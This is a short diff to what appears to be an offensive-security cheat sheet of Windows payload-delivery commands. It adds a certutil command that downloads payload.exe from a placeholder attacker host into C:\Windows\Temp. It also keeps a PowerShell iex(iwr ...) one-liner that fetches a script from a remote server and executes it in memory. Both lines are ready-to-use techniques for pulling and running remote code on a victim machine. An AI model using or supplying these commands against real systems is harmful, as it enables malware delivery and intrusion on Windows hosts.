@@ -1,3 +1,6 @@
+Certutil:
+  certutil -URLcache -split -f http://Attacker_IP/payload.exe C:\Windows\Temp\payload.exe
+
 Powershell Commands:
   iex(iwr -UseBasicParsing http://10.0.0.40:8080/t.ps1)
                            pull in the file from webserver and execute it locally without downloading it.
